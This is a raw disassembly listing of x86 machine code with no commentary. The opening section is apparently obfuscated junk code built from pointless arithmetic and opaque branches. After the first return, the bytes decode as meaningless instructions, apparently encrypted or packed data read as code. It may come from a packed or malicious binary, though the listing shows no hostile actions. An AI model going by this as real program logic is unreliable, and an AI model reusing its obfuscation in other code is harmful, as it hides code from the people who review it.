  40aaab:	87 f9                	xchg   %edi,%ecx
  40aaad:	ff c7                	inc    %edi
  40aaaf:	0f b7 c8             	movzwl %ax,%ecx
  40aab2:	81 eb 99 fa ff ff    	sub    $0xfffffa99,%ebx
  40aab8:	41                   	inc    %ecx
  40aab9:	81 c1 74 6a d1 f0    	add    $0xf0d16a74,%ecx
  40aabf:	81 eb 68 05 00 00    	sub    $0x568,%ebx
  40aac5:	f7 c6 3b ae 86 c6    	test   $0xc686ae3b,%esi
  40aacb:	0f bf ff             	movswl %di,%edi
  40aace:	ff c7                	inc    %edi
  40aad0:	0f bf ff             	movswl %di,%edi
  40aad3:	b5 81                	mov    $0x81,%ch
  40aad5:	81 fb c1 00 00 00    	cmp    $0xc1,%ebx
  40aadb:	73 05                	jae    0x40aae2
  40aadd:	e9 a4 fa ff ff       	jmp    0x40a586
  40aae2:	f7 c5 19 e9 b9 c2    	test   $0xc2b9e919,%ebp
  40aae8:	8b c9                	mov    %ecx,%ecx
  40aaea:	85 ed                	test   %ebp,%ebp
  40aaec:	f6 c0 18             	test   $0x18,%al
  40aaef:	31 d0                	xor    %edx,%eax
  40aaf1:	8d 3d 28 cc 3a 2f    	lea    0x2f3acc28,%edi
  40aaf7:	69 ce 2a ca 96 80    	imul   $0x8096ca2a,%esi,%ecx
  40aafd:	40                   	inc    %eax
  40aafe:	8d 35 a3 4b 0d 00    	lea    0xd4ba3,%esi
  40ab04:	0f af c9             	imul   %ecx,%ecx
  40ab07:	80 f8 e5             	cmp    $0xe5,%al
  40ab0a:	81 f6 c0 58 0a 00    	xor    $0xa58c0,%esi
  40ab10:	f3 03 d6             	repz add %esi,%edx
  40ab13:	80 c8 bc             	or     $0xbc,%al
  40ab16:	8a c5                	mov    %ch,%al
  40ab18:	86 d9                	xchg   %bl,%cl
  40ab1a:	81 ea 5b 13 07 00    	sub    $0x7135b,%edx
  40ab20:	f2 84 f2             	repnz test %dh,%dl
  40ab23:	74 0b                	je     0x40ab30
  40ab25:	80 d0 e5             	adc    $0xe5,%al
  40ab28:	8d 0d ea c2 97 97    	lea    0x9797c2ea,%ecx
  40ab2e:	88 e1                	mov    %ah,%cl
  40ab30:	86 cb                	xchg   %cl,%bl
  40ab32:	12 e8                	adc    %al,%ch
  40ab34:	81 fa e2 fe 00 00    	cmp    $0xfee2,%edx
  40ab3a:	0f 8c 13 fa ff ff    	jl     0x40a553
  40ab40:	c3                   	ret
  40ab41:	94                   	xchg   %eax,%esp
  40ab42:	8f                   	(bad)
  40ab43:	fc                   	cld
  40ab44:	be 58 53 ad f6       	mov    $0xf6ad5358,%esi
  40ab49:	43                   	inc    %ebx
  40ab4a:	f8                   	clc
  40ab4b:	7c 84                	jl     0x40aad1
  40ab4d:	cd 44                	int    $0x44
  40ab4f:	9d                   	popf
  40ab50:	9e                   	sahf
  40ab51:	c5 e8 df             	(bad)
  40ab54:	6d                   	insl   (%dx),%es:(%edi)
  40ab55:	8a 4f e8             	mov    -0x18(%edi),%cl
  40ab58:	0e                   	push   %cs
  40ab59:	95                   	xchg   %eax,%ebp
  40ab5a:	68 c0 91 b0 64       	push   $0x64b091c0
  40ab5f:	3d df 10 ae ad       	cmp    $0xadae10df,%eax
  40ab64:	7a a7                	jp     0x40ab0d
  40ab66:	1f                   	pop    %ds
  40ab67:	62 ab 8d 84 5a 3e    	bound  %ebp,0x3e5a848d(%ebx)
  40ab6d:	2b 76 b9             	sub    -0x47(%esi),%esi
  40ab70:	9a 09 e5 5e b5 b3 1a 	lcall  $0x1ab3,$0xb55ee509
  40ab77:	37                   	aaa
  40ab78:	48                   	dec    %eax
  40ab79:	a2 8f 99 b3 c4       	mov    %al,0xc4b3998f
  40ab7e:	5d                   	pop    %ebp
  40ab7f:	38 86 82 dd 3e 9d    	cmp    %al,-0x62c1227e(%esi)
  40ab85:	b4 f5                	mov    $0xf5,%ah
  40ab87:	c9                   	leave
  40ab88:	79 8b                	jns    0x40ab15
  40ab8a:	b7 81                	mov    $0x81,%bh
  40ab8c:	e7 04                	out    %eax,$0x4
  40ab8e:	00 a4 a9 87 8a da d6 	add    %ah,-0x29257579(%ecx,%ebp,4)
  40ab95:	95                   	xchg   %eax,%ebp
  40ab96:	1e                   	push   %ds
  40ab97:	b9 47 19 81 d9       	mov    $0xd9811947,%ecx
  40ab9c:	3c 3a                	cmp    $0x3a,%al
  40ab9e:	ad                   	lods   %ds:(%esi),%eax
  40ab9f:	7a a3                	jp     0x40ab44
  40aba1:	31 d8                	xor    %ebx,%eax
  40aba3:	d0 7e 10             	sarb   $1,0x10(%esi)
  40aba6:	20 af 8e 22 28 e1    	and    %ch,-0x1ed7dd72(%edi)
  40abac:	a9 70 77 d4 21       	test   $0x21d47770,%eax
  40abb1:	7a 14                	jp     0x40abc7
  40abb3:	c7                   	(bad)
  40abb4:	93                   	xchg   %eax,%ebx
  40abb5:	7f f3                	jg     0x40abaa
  40abb7:	4f                   	dec    %edi
  40abb8:	5f                   	pop    %edi
  40abb9:	51                   	push   %ecx
  40abba:	e6 49                	out    %al,$0x49
  40abbc:	40                   	inc    %eax
  40abbd:	51                   	push   %ecx
  40abbe:	a3 15 33 43 53       	mov    %eax,0x53433315
  40abc3:	32 4c c6 6f          	xor    0x6f(%esi,%eax,8),%cl
  40abc7:	0a 61 1b             	or     0x1b(%ecx),%ah
  40abca:	72 0a                	jb     0x40abd6
  40abcc:	79 ef                	jns    0x40abbd
  40abce:	f6 f0                	div    %al
  40abd0:	ae                   	scas   %es:(%edi),%al
  40abd1:	07                   	pop    %es
  40abd2:	c3                   	ret
  40abd3:	46                   	inc    %esi
  40abd4:	77 2a                	ja     0x40ac00
  40abd6:	ac                   	lods   %ds:(%esi),%al
  40abd7:	03 29                	add    (%ecx),%ebp
  40abd9:	86 59 4a             	xchg   %bl,0x4a(%ecx)
  40abdc:	99                   	cltd
  40abdd:	bd 1f 37 89 d6       	mov    $0xd689371f,%ebp
  40abe2:	1a d2                	sbb    %dl,%dl
  40abe4:	e9 3f 4b f8 aa       	jmp    0xab38f728
  40abe9:	24 44                	and    $0x44,%al
  40abeb:	38 14 66             	cmp    %dl,(%esi,%eiz,2)
  40abee:	17                   	pop    %ss
  40abef:	bc 41 34 e2 21       	mov    $0x21e23441,%esp
  40abf4:	c8 b4 ee 0f          	enter  $0xeeb4,$0xf
  40abf8:	87 da                	xchg   %ebx,%edx
  40abfa:	84 ee                	test   %ch,%dh
  40abfc:	ea 9c 82 3e 35 e8 f5 	ljmp   $0xf5e8,$0x353e829c
  40ac03:	d2 0b                	rorb   %cl,(%ebx)
  40ac05:	4f                   	dec    %edi
  40ac06:	93                   	xchg   %eax,%ebx
  40ac07:	c5 74 d4 4b          	lds    0x4b(%esp,%edx,8),%esi
  40ac0b:	53                   	push   %ebx
  40ac0c:	02 1e                	add    (%esi),%bl
  40ac0e:	03 32                	add    (%edx),%esi
  40ac10:	08 f3                	or     %dh,%bl
  40ac12:	c6                   	(bad)
  40ac13:	bf a8 a8 e7 c8       	mov    $0xc8e7a8a8,%edi
  40ac18:	9d                   	popf
  40ac19:	59                   	pop    %ecx
  40ac1a:	1e                   	push   %ds
  40ac1b:	f5                   	cmc
  40ac1c:	99                   	cltd
  40ac1d:	6d                   	insl   (%dx),%es:(%edi)
  40ac1e:	b7 b5                	mov    $0xb5,%bh
  40ac20:	0f 5d c1             	minps  %xmm1,%xmm0
  40ac23:	eb 2e                	jmp    0x40ac53
  40ac25:	30 b7 e0 05 b0 3a    	xor    %dh,0x3ab005e0(%edi)
  40ac2b:	eb 92                	jmp    0x40abbf
  40ac2d:	ce                   	into
  40ac2e:	73 66                	jae    0x40ac96
  40ac30:	91                   	xchg   %eax,%ecx
  40ac31:	1f                   	pop    %ds
  40ac32:	be 44 f1 ef 47       	mov    $0x47eff144,%esi
  40ac37:	bc df fa e3 b8       	mov    $0xb8e3fadf,%esp
  40ac3c:	da 17                	ficoml (%edi)
  40ac3e:	36 4a                	ss dec %edx
  40ac40:	3b 03                	cmp    (%ebx),%eax
  40ac42:	54                   	push   %esp
  40ac43:	92                   	xchg   %eax,%edx
  40ac44:	98                   	cwtl
  40ac45:	85 b0 e1 f7 1c d2    	test   %esi,-0x2de3081f(%eax)
  40ac4b:	2c d4                	sub    $0xd4,%al
  40ac4d:	99                   	cltd
  40ac4e:	92                   	xchg   %eax,%edx
  40ac4f:	a0 94 81 33 60       	mov    0x60338194,%al
  40ac54:	4f                   	dec    %edi
  40ac55:	e8 44 8a 05 9a       	call   0x9a46369e
  40ac5a:	94                   	xchg   %eax,%esp
  40ac5b:	43                   	inc    %ebx
  40ac5c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40ac5d:	f3 fa                	repz cli
  40ac5f:	cd 29                	int    $0x29
  40ac61:	98                   	cwtl
  40ac62:	97                   	xchg   %eax,%edi
  40ac63:	d4 50                	aam    $0x50
  40ac65:	5d                   	pop    %ebp
  40ac66:	f7 88 23 6f dd fd ac 	testl  $0x3f27ffac,-0x22290dd(%eax)
  40ac6d:	ff 27 3f 
  40ac70:	20 ba 8c 82 2b 4d    	and    %bh,0x4d2b828c(%edx)
  40ac76:	a8 12                	test   $0x12,%al
  40ac78:	12 fb                	adc    %bl,%bh
  40ac7a:	fa                   	cli
  40ac7b:	48                   	dec    %eax
  40ac7c:	bf ad 85 43 84       	mov    $0x844385ad,%edi
  40ac81:	ae                   	scas   %es:(%edi),%al
  40ac82:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac83:	69 2f 2c 95 bc b1    	imul   $0xb1bc952c,(%edi),%ebp
  40ac89:	da 26                	fisubl (%esi)
  40ac8b:	df b8 ec 79 e2 97    	fistpll -0x681d8614(%eax)
  40ac91:	5f                   	pop    %edi
  40ac92:	3a ba c5 48 b6 46    	cmp    0x46b648c5(%edx),%bh
  40ac98:	4b                   	dec    %ebx
  40ac99:	c9                   	leave
  40ac9a:	ed                   	in     (%dx),%eax
  40ac9b:	1f                   	pop    %ds
  40ac9c:	b1 73                	mov    $0x73,%cl
  40ac9e:	e6 d0                	out    %al,$0xd0
  40aca0:	4b                   	dec    %ebx
  40aca1:	d1 df                	rcr    $1,%edi
  40aca3:	bd cd c7 1b 8a       	mov    $0x8a1bc7cd,%ebp
  40aca8:	0a 81 85 fc 6c b9    	or     -0x4693037b(%ecx),%al
  40acae:	5d                   	pop    %ebp
  40acaf:	38 8f f2 b7 bc 12    	cmp    %cl,0x12bcb7f2(%edi)
  40acb5:	66 44                	inc    %sp
  40acb7:	4f                   	dec    %edi
  40acb8:	40                   	inc    %eax
  40acb9:	9c                   	pushf
  40acba:	45                   	inc    %ebp
  40acbb:	c9                   	leave
  40acbc:	ca cb ab             	lret   $0xabcb
  40acbf:	b9 bc 72 dc d6       	mov    $0xd6dc72bc,%ecx
  40acc4:	91                   	xchg   %eax,%ecx
  40acc5:	75 98                	jne    0x40ac5f
  40acc7:	30 e3                	xor    %ah,%bl
  40acc9:	6d                   	insl   (%dx),%es:(%edi)
  40acca:	e0 28                	loopne 0x40acf4
  40accc:	fe                   	(bad)
  40accd:	23 26                	and    (%esi),%esp
  40accf:	29 f3                	sub    %esi,%ebx
  40acd1:	c7 82 e5 e6 a4 ab 7b 	movl   $0xe5eece7b,-0x545b191b(%edx)
  40acd8:	ce ee e5 
  40acdb:	ed                   	in     (%dx),%eax
  40acdc:	21 9e fd 83 6c ea    	and    %ebx,-0x15937c03(%esi)
  40ace2:	69 62 a1 e6 af 0c 3c 	imul   $0x3c0cafe6,-0x5f(%edx),%esp
  40ace9:	8c 14 e6             	mov    %ss,(%esi,%eiz,8)
  40acec:	6a 4e                	push   $0x4e
  40acee:	b1 c1                	mov    $0xc1,%cl
  40acf0:	eb 37                	jmp    0x40ad29
  40acf2:	2a 41 c4             	sub    -0x3c(%ecx),%al
  40acf5:	5b                   	pop    %ebx
  40acf6:	cf                   	iret
  40acf7:	38 17                	cmp    %dl,(%edi)
  40acf9:	23 bb db 9e 54 73    	and    0x73549edb(%ebx),%edi
  40acff:	c3                   	ret
  40ad00:	23 6e 99             	and    -0x67(%esi),%ebp
  40ad03:	c7                   	(bad)
  40ad04:	f9                   	stc
  40ad05:	26 87 a3 56 bb 18 5a 	xchg   %esp,%es:0x5a18bb56(%ebx)
  40ad0c:	75 c7                	jne    0x40acd5
  40ad0e:	70 2a                	jo     0x40ad3a
  40ad10:	f7 6d 38             	imull  0x38(%ebp)
  40ad13:	7c 0e                	jl     0x40ad23
  40ad15:	53                   	push   %ebx
  40ad16:	0a 49 83             	or     -0x7d(%ecx),%cl
  40ad19:	81 b5 65 40 44 12 d4 	xorl   $0x8416dd4,0x12444065(%ebp)
  40ad20:	6d 41 08 
  40ad23:	8e fb                	mov    %ebx,%?
  40ad25:	81 19 a4 1b c0 a2    	sbbl   $0xa2c01ba4,(%ecx)
  40ad2b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad2c:	22 b9 7d e4 43 8e    	and    -0x71bc1b83(%ecx),%bh
  40ad32:	8a 9a 97 3c 33 ee    	mov    -0x11ccc369(%edx),%bl
  40ad38:	0e                   	push   %cs
  40ad39:	3b 66 08             	cmp    0x8(%esi),%esp
  40ad3c:	45                   	inc    %ebp
  40ad3d:	42                   	inc    %edx
  40ad3e:	88 2f                	mov    %ch,(%edi)
  40ad40:	f7 2a                	imull  (%edx)
  40ad42:	de 9a 41 cf 93 01    	ficomps 0x193cf41(%edx)
  40ad48:	3b f5                	cmp    %ebp,%esi
  40ad4a:	e3 6d                	jecxz  0x40adb9
  40ad4c:	e4 4b                	in     $0x4b,%al
  40ad4e:	28 f3                	sub    %dh,%bl
  40ad50:	09 40 57             	or     %eax,0x57(%eax)
  40ad53:	83 ff 5b             	cmp    $0x5b,%edi
  40ad56:	8c 19                	mov    %ds,(%ecx)
  40ad58:	ab                   	stos   %eax,%es:(%edi)
  40ad59:	cf                   	iret
  40ad5a:	42                   	inc    %edx
  40ad5b:	cd de                	int    $0xde
  40ad5d:	7d 85                	jge    0x40ace4
  40ad5f:	ef                   	out    %eax,(%dx)
  40ad60:	f0 1a 09             	lock sbb (%ecx),%cl
  40ad63:	f5                   	cmc
  40ad64:	ec                   	in     (%dx),%al
  40ad65:	6a f1                	push   $0xfffffff1
  40ad67:	3e eb 52             	ds jmp 0x40adbc
  40ad6a:	89 64 0e 57          	mov    %esp,0x57(%esi,%ecx,1)
  40ad6e:	3f                   	aas
  40ad6f:	8a c1                	mov    %cl,%al
  40ad71:	42                   	inc    %edx
  40ad72:	42                   	inc    %edx
  40ad73:	bc 83 95 08 fa       	mov    $0xfa089583,%esp
  40ad78:	8d                   	lea    (bad),%esi
  40ad79:	f1                   	int1
  40ad7a:	16                   	push   %ss
  40ad7b:	cb                   	lret
  40ad7c:	69 a0 04 69 d3 f3 04 	imul   $0xa7699704,-0xc2c96fc(%eax),%esp
  40ad83:	97 69 a7 
  40ad86:	b6 2a                	mov    $0x2a,%dh
  40ad88:	4c                   	dec    %esp
  40ad89:	39 6e ba             	cmp    %ebp,-0x46(%esi)
  40ad8c:	29 33                	sub    %esi,(%ebx)
  40ad8e:	9b                   	fwait
  40ad8f:	f9                   	stc
  40ad90:	ba 30 c0 48 42       	mov    $0x4248c030,%edx
  40ad95:	b5 25                	mov    $0x25,%ch
  40ad97:	56                   	push   %esi
  40ad98:	2e b1 c4             	cs mov $0xc4,%cl
  40ad9b:	47                   	inc    %edi
  40ad9c:	a3 ed 70 c0 00       	mov    %eax,0xc070ed
  40ada1:	cf                   	iret
  40ada2:	2d 0e e1 0c 2f       	sub    $0x2f0ce10e,%eax
  40ada7:	7b 5c                	jnp    0x40ae05
  40ada9:	3d 8c cb 48 9c       	cmp    $0x9c48cb8c,%eax
  40adae:	a9 56 81 6c cc       	test   $0xcc6c8156,%eax
  40adb3:	f5                   	cmc
  40adb4:	d8 6e 4d             	fsubrs 0x4d(%esi)
  40adb7:	bd 93 07 2a 83       	mov    $0x832a0793,%ebp
  40adbc:	e2 3a                	loop   0x40adf8
  40adbe:	6a 69                	push   $0x69
  40adc0:	87 48 df             	xchg   %ecx,-0x21(%eax)
  40adc3:	4d                   	dec    %ebp
  40adc4:	46                   	inc    %esi
  40adc5:	9d                   	popf
  40adc6:	30 5c 90 59          	xor    %bl,0x59(%eax,%edx,4)
  40adca:	64 62 02             	bound  %eax,%fs:(%edx)
  40adcd:	10 a0 1c fe 70 d5    	adc    %ah,-0x2a8f01e4(%eax)
  40add3:	94                   	xchg   %eax,%esp
  40add4:	ac                   	lods   %ds:(%esi),%al
  40add5:	34 7e                	xor    $0x7e,%al
  40add7:	35 d9 f5 b6 20       	xor    $0x20b6f5d9,%eax
  40addc:	8d 0c d4             	lea    (%esp,%edx,8),%ecx
  40addf:	83 59 9e 52          	sbbl   $0x52,-0x62(%ecx)
  40ade3:	77 60                	ja     0x40ae45
  40ade5:	89 15 95 80 ad bc    	mov    %edx,0xbcad8095
  40adeb:	dd aa 0f e9 cb 19    	(bad) 0x19cbe90f(%edx)
  40adf1:	71 a5                	jno    0x40ad98
  40adf3:	11 52 ae             	adc    %edx,-0x52(%edx)
  40adf6:	8e 5c 5f fa          	mov    -0x6(%edi,%ebx,2),%ds
  40adfa:	38 6b 57             	cmp    %ch,0x57(%ebx)
  40adfd:	2f                   	das
  40adfe:	87 d9                	xchg   %ebx,%ecx
  40ae00:	2f                   	das
  40ae01:	f2 23 ba f6 ad 6d ca 	repnz and -0x3592520a(%edx),%edi
  40ae08:	7c 17                	jl     0x40ae21
  40ae0a:	dc dd                	(bad)
  40ae0c:	64 11 a7 f6 ef dc 1b 	adc    %esp,%fs:0x1bdceff6(%edi)
  40ae13:	60                   	pusha
  40ae14:	7a 9d                	jp     0x40adb3
  40ae16:	21 93 b4 aa b5 42    	and    %edx,0x42b5aab4(%ebx)
  40ae1c:	f4                   	hlt
  40ae1d:	c4 32                	les    (%edx),%esi
  40ae1f:	bb 0f 0e 08 5f       	mov    $0x5f080e0f,%ebx
  40ae24:	67 a9 cb 8c 9a ec    	addr16 test $0xec9a8ccb,%eax
  40ae2a:	f6 18                	negb   (%eax)
  40ae2c:	59                   	pop    %ecx
  40ae2d:	cd f4                	int    $0xf4
  40ae2f:	f7 c3 a1 66 4f 3d    	test   $0x3d4f66a1,%ebx
  40ae35:	a9 8c f0 f4 ff       	test   $0xfff4f08c,%eax
  40ae3a:	b0 6f                	mov    $0x6f,%al
  40ae3c:	3b 9e 8f f6 75 f6    	cmp    -0x98a0971(%esi),%ebx
  40ae42:	57                   	push   %edi
  40ae43:	52                   	push   %edx
  40ae44:	48                   	dec    %eax
  40ae45:	c3                   	ret
  40ae46:	1f                   	pop    %ds
  40ae47:	74 60                	je     0x40aea9
  40ae49:	8b de                	mov    %esi,%ebx
  40ae4b:	ef                   	out    %eax,(%dx)
  40ae4c:	9a 3d 04 ff 35 2a b6 	lcall  $0xb62a,$0x35ff043d
  40ae53:	c2 52 b2             	ret    $0xb252
  40ae56:	ea a4 87 69 88 cb 82 	ljmp   $0x82cb,$0x886987a4
  40ae5d:	8c 69 6a             	mov    %gs,0x6a(%ecx)
  40ae60:	ce                   	into
  40ae61:	3e 83 88 34 60 cf 3a 	orl    $0x0,%ds:0x3acf6034(%eax)
  40ae68:	00 
  40ae69:	ad                   	lods   %ds:(%esi),%eax
  40ae6a:	92                   	xchg   %eax,%edx
  40ae6b:	61                   	popa
  40ae6c:	6b 05 ff 70 03 8a dd 	imul   $0xffffffdd,0x8a0370ff,%eax
  40ae73:	e2 9f                	loop   0x40ae14
  40ae75:	7f 2a                	jg     0x40aea1
  40ae77:	d6                   	salc
  40ae78:	4b                   	dec    %ebx
  40ae79:	a0 b9 f0 68 aa       	mov    0xaa68f0b9,%al
  40ae7e:	b6 20                	mov    $0x20,%dh
  40ae80:	10 08                	adc    %cl,(%eax)
  40ae82:	1b 1f                	sbb    (%edi),%ebx
  40ae84:	5d                   	pop    %ebp
  40ae85:	9c                   	pushf
  40ae86:	23 a3 83 94 1e 6e    	and    0x6e1e9483(%ebx),%esp
  40ae8c:	4b                   	dec    %ebx
  40ae8d:	5a                   	pop    %edx
  40ae8e:	e7 28                	out    %eax,$0x28
  40ae90:	49                   	dec    %ecx
  40ae91:	54                   	push   %esp
  40ae92:	b5 fa                	mov    $0xfa,%ch
  40ae94:	ee                   	out    %al,(%dx)
  40ae95:	da 73 d6             	fidivl -0x2a(%ebx)
  40ae98:	4f                   	dec    %edi
  40ae99:	28 58 0b             	sub    %bl,0xb(%eax)
  40ae9c:	85 83 1a 29 fc 8d    	test   %eax,-0x7203d6e6(%ebx)
  40aea2:	6d                   	insl   (%dx),%es:(%edi)
  40aea3:	a0 cd 97 f9 a3       	mov    0xa3f997cd,%al
  40aea8:	3e fa                	ds cli
  40aeaa:	6c                   	insb   (%dx),%es:(%edi)
  40aeab:	e7 25                	out    %eax,$0x25
  40aead:	60                   	pusha
  40aeae:	71 0a                	jno    0x40aeba
  40aeb0:	fc                   	cld
  40aeb1:	dd a4 df 19 ed 78 08 	frstor 0x878ed19(%edi,%ebx,8)
  40aeb8:	c6 78                	xabort $0x78,(bad)
  40aeba:	0a 35 31 82 13 c5    	or     0xc5138231,%dh
  40aec0:	79 33                	jns    0x40aef5
  40aec2:	54                   	push   %esp
  40aec3:	d9 b3 76 3f 56 5c    	fnstenv 0x5c563f76(%ebx)
  40aec9:	15 74 df cc a0       	adc    $0xa0ccdf74,%eax
  40aece:	ff 96 f6 28 fc f3    	call   *-0xc03d70a(%esi)
  40aed4:	79 a0                	jns    0x40ae76
  40aed6:	3e dc b6 45 87 49 eb 	fdivl  %ds:-0x14b678bb(%esi)
  40aedd:	64 4d                	fs dec %ebp
  40aedf:	73 f2                	jae    0x40aed3
  40aee1:	4e                   	dec    %esi
  40aee2:	c2 d5 75             	ret    $0x75d5
  40aee5:	e5 de                	in     $0xde,%eax
  40aee7:	5c                   	pop    %esp
  40aee8:	c3                   	ret
  40aee9:	40                   	inc    %eax
  40aeea:	37                   	aaa
  40aeeb:	4f                   	dec    %edi
  40aeec:	14 b0                	adc    $0xb0,%al
  40aeee:	11 81 73 7f d4 4f    	adc    %eax,0x4fd47f73(%ecx)
  40aef4:	c1 df 5f             	rcr    $0x5f,%edi
  40aef7:	86 5f 08             	xchg   %bl,0x8(%edi)
  40aefa:	82 ce e4             	or     $0xe4,%dh
  40aefd:	1f                   	pop    %ds
  40aefe:	b6 9a                	mov    $0x9a,%dh
  40af00:	ec                   	in     (%dx),%al
  40af01:	60                   	pusha
  40af02:	20 40 2a             	and    %al,0x2a(%eax)
  40af05:	56                   	push   %esi
  40af06:	54                   	push   %esp
  40af07:	c3                   	ret
  40af08:	bc 07 68 1b 4d       	mov    $0x4d1b6807,%esp
  40af0d:	59                   	pop    %ecx
  40af0e:	3b 1d ce ef da 4f    	cmp    0x4fdaefce,%ebx
  40af14:	9f                   	lahf
  40af15:	ed                   	in     (%dx),%eax
  40af16:	ae                   	scas   %es:(%edi),%al
  40af17:	33 65 d0             	xor    -0x30(%ebp),%esp
  40af1a:	b1 74                	mov    $0x74,%cl
  40af1c:	e3 3d                	jecxz  0x40af5b
  40af1e:	f5                   	cmc
  40af1f:	e5 93                	in     $0x93,%eax
  40af21:	58                   	pop    %eax
  40af22:	1d 6e bf e9 3e       	sbb    $0x3ee9bf6e,%eax
  40af27:	8e 3f                	mov    (%edi),%?
  40af29:	4c                   	dec    %esp
  40af2a:	ad                   	lods   %ds:(%esi),%eax
  40af2b:	ea 8f df 45 d8 43 e4 	ljmp   $0xe443,$0xd845df8f
  40af32:	41                   	inc    %ecx
  40af33:	64 e0 40             	fs loopne 0x40af76
  40af36:	9b                   	fwait
  40af37:	53                   	push   %ebx
  40af38:	fa                   	cli
  40af39:	7a 79                	jp     0x40afb4
  40af3b:	25 d1 bd 19 a4       	and    $0xa419bdd1,%eax
  40af40:	af                   	scas   %es:(%edi),%eax
  40af41:	64 7a 16             	fs jp  0x40af5a
  40af44:	21 fc                	and    %edi,%esp
  40af46:	ab                   	stos   %eax,%es:(%edi)
  40af47:	6c                   	insb   (%dx),%es:(%edi)
  40af48:	9d                   	popf
  40af49:	15 cc 8a 10 37       	adc    $0x37108acc,%eax
  40af4e:	b2 5c                	mov    $0x5c,%dl
  40af50:	3d ab 1b 38 c9       	cmp    $0xc9381bab,%eax
  40af55:	17                   	pop    %ss
  40af56:	43                   	inc    %ebx
  40af57:	bb 64 eb a0 a1       	mov    $0xa1a0eb64,%ebx
  40af5c:	72 f9                	jb     0x40af57
  40af5e:	8c fc                	mov    %?,%esp
  40af60:	0c f8                	or     $0xf8,%al
  40af62:	9b                   	fwait
  40af63:	74 ae                	je     0x40af13
  40af65:	87 5d c8             	xchg   %ebx,-0x38(%ebp)
  40af68:	e9 56 e5 44 d0       	jmp    0xd08594c3
  40af6d:	dc 0b                	fmull  (%ebx)
  40af6f:	4d                   	dec    %ebp
  40af70:	61                   	popa
  40af71:	b9 27 01 37 0a       	mov    $0xa370127,%ecx
  40af76:	8a 76 4c             	mov    0x4c(%esi),%dh
  40af79:	22 3a                	and    (%edx),%bh
  40af7b:	3a 5c 40 89          	cmp    -0x77(%eax,%eax,2),%bl
  40af7f:	36 3c 3d             	ss cmp $0x3d,%al
  40af82:	0b 5f 77             	or     0x77(%edi),%ebx
  40af85:	16                   	push   %ss
  40af86:	6d                   	insl   (%dx),%es:(%edi)
  40af87:	04 e5                	add    $0xe5,%al
  40af89:	88 a2 ec 91 27 3a    	mov    %ah,0x3a2791ec(%edx)
  40af8f:	11 bf b6 e3 7c 1b    	adc    %edi,0x1b7ce3b6(%edi)
  40af95:	5a                   	pop    %edx
  40af96:	c7                   	(bad)
  40af97:	1a 17                	sbb    (%edi),%dl
  40af99:	16                   	push   %ss
  40af9a:	33 2c 57             	xor    (%edi,%edx,2),%ebp
  40af9d:	e9 dc 4a b6 f0       	jmp    0xf0f6fa7e
  40afa2:	4c                   	dec    %esp
  40afa3:	fa                   	cli
  40afa4:	c7                   	(bad)
  40afa5:	cb                   	lret
  40afa6:	c4 9e 2a 9d f2 08    	les    0x8f29d2a(%esi),%ebx
  40afac:	ff e4                	jmp    *%esp
  40afae:	51                   	push   %ecx
  40afaf:	c6                   	(bad)
  40afb0:	4d                   	dec    %ebp
  40afb1:	38 7c f5 ce          	cmp    %bh,-0x32(%ebp,%esi,8)
  40afb5:	aa                   	stos   %al,%es:(%edi)
  40afb6:	d9 6a 58             	fldcw  0x58(%edx)
  40afb9:	3f                   	aas
  40afba:	92                   	xchg   %eax,%edx
  40afbb:	d8 e0                	fsub   %st(0),%st
  40afbd:	04 97                	add    $0x97,%al
  40afbf:	5e                   	pop    %esi
  40afc0:	29 bc 49 93 91 34 55 	sub    %edi,0x55349193(%ecx,%ecx,2)
  40afc7:	2a 44 16 16          	sub    0x16(%esi,%edx,1),%al
  40afcb:	c0 44 4e a9 9f       	rolb   $0x9f,-0x57(%esi,%ecx,2)
  40afd0:	f7 73 78             	divl   0x78(%ebx)
  40afd3:	37                   	aaa
  40afd4:	9e                   	sahf
  40afd5:	ab                   	stos   %eax,%es:(%edi)
  40afd6:	2c f2                	sub    $0xf2,%al
  40afd8:	69 ef a2 ac 57 20    	imul   $0x2057aca2,%edi,%ebp
  40afde:	63 07                	arpl   %eax,(%edi)
  40afe0:	5e                   	pop    %esi
  40afe1:	34 ea                	xor    $0xea,%al
  40afe3:	cb                   	lret
  40afe4:	60                   	pusha
  40afe5:	b6 a1                	mov    $0xa1,%dh
  40afe7:	98                   	cwtl
  40afe8:	73 0a                	jae    0x40aff4
  40afea:	f2 db 8e da cc e9 73 	repnz fisttpl 0x73e9ccda(%esi)
  40aff1:	15 88 f8 e7 d0       	adc    $0xd0e7f888,%eax
  40aff6:	ed                   	in     (%dx),%eax
  40aff7:	b1 b3                	mov    $0xb3,%cl
  40aff9:	ec                   	in     (%dx),%al
  40affa:	cd 82                	int    $0x82
  40affc:	9f                   	lahf
  40affd:	55                   	push   %ebp
  40affe:	86 5e 5d             	xchg   %bl,0x5d(%esi)
  40b001:	05 01 be f0 97       	add    $0x97f0be01,%eax
  40b006:	51                   	push   %ecx
  40b007:	24 8c                	and    $0x8c,%al
  40b009:	90                   	nop
  40b00a:	d1 9f 0f 0d 84 5a    	rcrl   $1,0x5a840d0f(%edi)
  40b010:	85 c3                	test   %eax,%ebx
  40b012:	fe c7                	inc    %bh
  40b014:	f7 0a f8 a6 c5 3c    	testl  $0x3cc5a6f8,(%edx)
  40b01a:	08 2a                	or     %ch,(%edx)
  40b01c:	70 79                	jo     0x40b097
  40b01e:	ab                   	stos   %eax,%es:(%edi)
  40b01f:	d2 67 3d             	shlb   %cl,0x3d(%edi)
  40b022:	a3 a3 e8 91 f1       	mov    %eax,0xf191e8a3
  40b027:	2d c8 ed 7c 4d       	sub    $0x4d7cedc8,%eax
  40b02c:	ea 59 0b ec 12 85 c6 	ljmp   $0xc685,$0x12ec0b59
  40b033:	06                   	push   %es
  40b034:	2f                   	das
  40b035:	d6                   	salc
  40b036:	05 29 08 f7 09       	add    $0x9f70829,%eax
  40b03b:	10 f7                	adc    %dh,%bh
  40b03d:	ba e5 c8 f1 8a       	mov    $0x8af1c8e5,%edx
  40b042:	7b c6                	jnp    0x40b00a
  40b044:	65 bd 6c bf 53 87    	gs mov $0x8753bf6c,%ebp
  40b04a:	0f a1                	pop    %fs
  40b04c:	35 1b 8f 27 fd       	xor    $0xfd278f1b,%eax
  40b051:	f5                   	cmc
  40b052:	3c 07                	cmp    $0x7,%al
  40b054:	a1 0a 99 ac 68       	mov    0x68ac990a,%eax
  40b059:	71 af                	jno    0x40b00a
  40b05b:	33 2e                	xor    (%esi),%ebp
  40b05d:	fa                   	cli
